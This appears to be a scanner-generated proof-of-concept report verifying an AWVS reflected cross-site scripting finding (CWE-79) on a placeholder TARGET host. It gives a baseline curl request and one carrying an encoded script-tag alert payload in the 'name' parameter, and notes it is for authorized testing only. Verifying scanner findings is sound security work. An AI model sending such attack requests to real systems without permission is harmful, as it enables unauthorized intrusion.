# POC — AWVS: Cross-site Scripting (XSS)

- finding_id: `URL-2f27bd4688ab`
- type: `xss` / CWE-79
- severity: `high`
- file: `:0`

## 步骤

1. **Baseline request**  
```http
curl -sS -i -X GET 'http://TARGET:8080/053.php?name=SafeText' \
  -H 'User-Agent: Sunset-AWVS-Probe/2.0' \
  -H 'Accept: */*'
```
预期：HTTP 200 and the normal application response.

2. **Replay the AWVS attack request (跨站脚本)**  
```http
curl -sS -i -X GET 'http://TARGET:8080/053.php?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E' \
  -H 'User-Agent: Sunset-AWVS-Probe/2.0' \
  -H 'Accept: */*'
```
预期：The response contains the raw script payload without HTML encoding.

3. **Compare baseline and attack responses**  
预期：A security-relevant differential appears.

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。